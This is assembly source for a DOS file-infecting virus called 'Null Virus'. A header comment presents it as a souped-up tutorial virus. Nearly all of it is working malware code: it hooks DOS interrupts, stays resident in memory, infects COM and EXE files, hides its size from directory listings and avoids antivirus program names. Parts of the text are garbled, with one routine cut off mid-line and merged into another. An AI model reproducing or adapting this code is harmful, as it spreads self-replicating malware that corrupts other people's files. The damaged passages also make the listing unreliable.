;	Null Virus (souped-up version)
;
;	This virus is a simple full stealth virus, employing disinfection on
;opening. It's also a fast infector of COM and EXE, hitting files on close,
;attrib, rename and execute. This virus was originally written as a tutorial,
;I later pulled out the source and souped it up, the simplicity is
;intentional. Compile and run the code at your own risk. Don't come crying to
;me if your computer is damaged (though I can't possibly see how.. oh well).
;Compile with a86. Should be 996 bytes in size.
;
;	This code is copyright Buz [FS]. Any theft of code or such nonsense
;may result in death or dismemberment.

vsize	equ	old_24h-start
memsize	equ	end_heap-start
psize	equ	vsize/10h+1
EXE_dsp	equ	EXE_dispatch-COM_dispatch

work_buffer	equ old_24h+4
filename	equ work_buffer+1ah
@stack		equ filename+0dh
end_heap	equ @stack+40h

org	0h

start:
	call	verklemmt

verklemmt:
	pop	si
	sub	si,3
	push	ds
	push	es
	mov	ax,3056h
	int	21h
	cmp	ax,303h
	jz	dispatch

be_thankful:
	mov	ah,52h
	int	21h
	mov	ax,word ptr es:[bx-2]
	xor	di,di

protecto:
	mov	ds,ax
	cmp	byte ptr [di],'Z'
	jz	found_MCB
	mov	bx,ax
	add	ax,word ptr [di+3]
	inc	ax
	jmp	short protecto

found_MCB:
	mov	ax,psize
	cmp	word ptr [di+1],ax
	jae	fix_block
	mov	ds,bx

fix_block:
	sub	word ptr [di+3],ax
	sub	word ptr [di+12h],ax
	mov	es,word ptr [di+12h]
        mov     cx,memsize
	cld
	push	si
	rep	movsb
	push	cs
	mov	ax,offset dispatch
	push	ax
	push	es
	mov	ax,offset get_int21h
	push	ax
	retf

	db 'NULL'

get_int21h:
        mov     ax,3521h
        int     21h
	push	cs
	pop	ds
	mov	word ptr [old_21h],bx
	mov	word ptr [old_21h+2],es
        mov	ax,2521h
	mov	dx,offset int21h_handler                    
	int	21h

dispatch:
	db	0e9h
dsp	dw	0

COM_dispatch:
	pop	es
	mov	si,offset buffer
	mov	di,100h
	pop	ds
	push	ds
	push	di
	movsw
	movsb
	jmp	short clear_regs

EXE_dispatch:
	pop	es
	mov	si,offset buffer+0eh
	lodsw
	cli
	mov	ss,ax
	lodsw
	mov	sp,ax
	sti
	lodsw
	lodsw
	xchg	ax,bx
	lodsw
	pop	ds
	push	ax
	push	bx

clear_regs:
	xor	ax,ax
	mov	bx,ax
	mov	cx,ax
	mov	dx,ax
	mov	si,ax
	mov	di,ax
	mov	bp,ax
	retf

kstealth_FCB:
	call	int21h
	or	al,al
	jnz	kstealth_done2
	pusha
	push	ds
	push	es
	mov	ah,2fh
	call	int21h
	push	es
	pop	ds
	mov	si,bx
	lodsb
	inc	ax
	jnz	not_extended
	add	si,7

not_extended:
	add	si,15h
	lodsw
	xchg	ax,bx
	call	chk_inf
	jc	kstealth_done1
	sub	si,8

butter:
	sub	word ptr [si],vsize
	sbb	word ptr [si+2],0

kstealth_done1:
	pop	es
	pop	ds
	popa

kstealth_done2:
	iret

kstealth_DTA:
	call	int21h
	jc	kstealth_error
	pusha
	push	ds
	push	es
	mov	ah,2fh
	call	int21h
	push	es
	pop	ds
	mov	si,bx
	add	si,16h
	lodsw
	xchg	ax,bx
	call	chk_inf
	jc	kstealth_done1
	lodsw
	jmp	short butter
	
kstealth_error:
	popf
	stc
	retf	2

int21h_handler:
	cmp	ax,3056h
	jz	res_check
	cmp	ax,11h
	jz	kstealth_FCB
	cmp	ax,12h
	jz	kstealth_FCB
	cmp	ah,3dh
	jz	clean
	cmp	ah,3eh
	jz	close
	cmp	ah,43h
	jz	letsgo
	cmp	ah,4bh
	jz	execute
	cmp	ah,4eh
	jz	kstealth_DTA
	cmp	ah,4fh
	jz	kstealth_DTA
	cmp	ah,56h
	jz	letsgo
	cmp	ax,6c00h
	jz	into_the_light

return_21h:
	db	0eah
old_21h	dd	0

res_check:
	mov	ax,303h
_iret:	iret

sig	db	'BUZ',0

close:
	call	get_SFT
	push	es
	pop	ds
	mov	si,di
	add	si,20h
	call	ASCIIZ_filename
	call	int21h
	push	cs
	pop	ds
	push	cs
	pop	es
	mov	dx,offset filename
	mov	ah,30h

letsgo:
	call	queef
	jmp	short return_21h

into_the_light:
	mov	dx,si
	jmp	short clean

execute:
	or	al,al
	jz	letsgo

clean:
	mov	ax,3d02h
	call	int21h
	pusha
	push	ds
	push	es
	xchg	bx,ax
	call	chk_handle
	jc	all_clear
	call	set_int24h
	call	disinfect
	call	reset_int24h

all_clear:
	pop	es
	pop	ds
	popa
	iret	

queef:
	pusha
	push	ds
	push	es
	call	set_int24h

copy_fname:
	push	cs
	pop	es
	mov	si,dx
	mov	di,offset filename
	mov	cx,0dh
	rep	movsb
	push	cs
	pop	ds
	mov	dx,offset filename
	mov	si,dx

k_zero:
	lodsb
	or	al,al
	jnz	k_zero

k_check:
	sub	si,4
	lodsw
	cmp	ax,'XE'
	jz	verify_EXE
	cmp	ax,'OC'
	jnz	bomb_out
	lodsb
	cmp	ax,'M'
	jnz	bomb_out

verify_EXE:
	lodsb
	cmp	ax,'E'
	jz	get_attribs
	mov	cx,6
	mov	si,dx
	mov	di,offset names
	lodsw

k_name:
	scasw
	jz	bomb_out
	loop	k_name


bomb_out:
	jmp	end_it_all

get_attribs:
	mov	ax,4300h
	call	int21h
	push	dx
	push	cx
	mov	ax,4301h
	xor	cx,cx
	push	ax
	call	int21h

open_file:
	mov	ax,3d02h
	call	int21h
	xchg	ax,bx
	call	chk_handle
	jnc	proceed
	jmp	were_outta_here

proceed:
	mov	ax,5700h
	call	int21h
	push	dx
	push	cx

read:
	mov	ah,3fh
	mov	dx,offset buffer
	push	dx
	push	dx
	mov	cx,1ah
	push	cx
	call	int21h
	pop	cx
	pop	si
	mov	di,offset work_buffer
	rep	movsb
	pop	si

chk_type:
	lodsw
	cmp	ax,'MZ'
	jz	EXE_file
	cmp	ax,'ZM'
	jz	EXE_file

COM_file:
	call	lseek_EOF
	sub	ax,3
	dec	si
	dec	si
	mov	dx,si
	push	ax
	mov	al,0e9h
	stosb
	pop	ax
	stosw
	call	lseek_EOF
	mov	ah,40h
	mov	cx,3
	call	int21h
	xor	ax,ax
	mov	di,offset dsp
	stosb
	jmp	short write_body

EXE_file:
	call	lseek_EOF
	push	dx
	push	ax
	push	dx
	push	ax
	push	dx
	push	ax
	lodsw
	xchg	bp,ax
	lodsw
	mov	cx,200h
	mul	cx
	add	ax,bp
	pop	cx
	pop	bp
	cmp	ax,cx
	jb	were_outta_here2
	cmp	dx,bp
	jb	were_outta_here2
	mov	si,offset work_buffer
	cmp	word ptr [si+18h],40h
	jb	fix_csip

were_outta_here2:
	pop	ax
	pop	ax
	pop	ax
	pop	ax
	jmp	short were_outta_here

fix_csip:
	pop	ax
	pop	dx
	mov	cl,0ch
	shl	dx,cl
	push	ax
	mov	cl,4
	shr	ax,cl
	add	dx,ax
	shl	ax,cl
	pop	cx
	sub	cx,ax
	mov	ax,word ptr [si+8]
	sub	dx,ax
	mov	word ptr [si+14h],cx
	mov	word ptr [si+16h],dx

fix_sssp:
	mov	word ptr [si+0eh],dx
	mov	ax,offset @stack
	mov	word ptr [si+10h],ax

fix_pages:
	pop	ax
	pop	dx
	add	ax,vsize
	adc	dx,0
	mov	cx,200h
	div	cx
	or	dx,dx
	jz	noinc
	inc	ax

noinc:
	mov	word ptr [si+2],dx
	mov	word ptr [si+4],ax

write_header:
	call	lseek_BOF
	mov	ah,40h
	mov	cx,1ah
	mov	dx,offset work_buffer
	call	int21h
	mov	ax,EXE_dsp
	mov	di,offset dsp
	stosb

write_body:
	call	lseek_EOF
	mov	ah,40h
	mov	cx,vsize
	mov	dx,offset start
	call	int21h

set_mark:
	pop	cx
	mov	ax,cx
	shr	ax,5
	and	al,011111b
	and	cl,011100000b
	or	al,cl
	pop	dx
	mov	ax,5701h
	call	int21h

were_outta_here:
	mov	ah,3eh
	call	int21h

set_attribs:
	pop	ax
	pop	cx
	pop	dx

end_it_all:
	call	int21h
	call	reset_int24h
	pop	es
	pop	ds
	popa

disinfect:
	push	ds
	push	cs
	pop	ds
	call	lseek_EOF
	mov	cx,ax
	xchg	ax,dx
	sub	dx,(offset buffer-offset old_24h)
	sbb	cx,0
	mov	al,1
	call	lseek
	mov	ah,3fh
	mov	cx,1ah
	mov	dx,offset work_buffer
	push	dx
	push	cx
	call	int21h
	call	lseek_BOF
	mov	ah,40h
	pop	cx		;cx = 1ah
	pop	dx		;dx = offset work_buffer
	call	int21h		;write it to the start
	call	lseek_EOF
	sub	ax,vsize
	sbb	dx,0
	mov	cx,dx
	xchg	ax,dx
	mov	al,01
	call	lseek
	mov	ah,40h
	xor	cx,cx
	call	int21h
	call	lseek_BO	pushf
	call	dword ptr cs:[old_21h]
	ret

set_int24h:
	mov	ax,3521h
	call	int21h
	push	cs
	pop	ds
	mov	word ptr [old_24h],bx
	mov	word ptr [old_24h+2],es
	mov	ax,2521h
	mov	dx,offset _iret
	call	int21h
	ret

reset_int24h:
	mov	dx,word ptr [old_24h]
	mov	ax,word ptr [old_24h+2]
	mov	es,ax
	mov	ax,2521h
	call	int21h
	ret

get_SFT:
	push	ax
	push	bx
	mov	ax,1220h
	int	2fh
	jc	SFT_error
	mov	bl,byte ptr es:[di]
	mov	ax,1216h
	int	2fh
	jc	SFT_error
    
SFT_error:
	pop bx
	pop ax
	ret

chk_handle:
	pusha
	mov	ax,5700h
	call	int21h
	jmp	short chk_cx

chk_inf:
	pusha

chk_cx:
	mov	ax,cx
	shr	ax,6
	and	ax,011111b
	and	cx,011111b
	cmp	ax,cx
	jnz	no_inf
	popa
	clc
	ret

no_inf:
	popa
	stc
	ret

ASCIIZ_filename:
	pusha
	push	es
	push	si
	push	cs
	pop	es
	mov	di,offset filename
	mov	cx,8

copy_name:
	lodsb
	or 	al,al
	jz	copy_ext
	stosb
	loop	copy_name

make_dot:
	mov	al,2eh          ;ascii period
	stosb

copy_ext:
	pop	si
	add	si,8            ;si now points to file extension
	movsw
	movsb
	xor	al,al
	stosb
	pop	es
	popa
	ret

lseek_BOF:
	xor	ax,ax
	jmp	short do_lseek

lseek_EOF:
	mov	ax,2

do_lseek:
	xor	cx,cx
	cwd

lseek:
	mov	ah,42h
	call	int21h
	ret

names	db	'SCCLVSVIAVF',0dh

buffer	db	1ah dup (?)
    
old_24h:
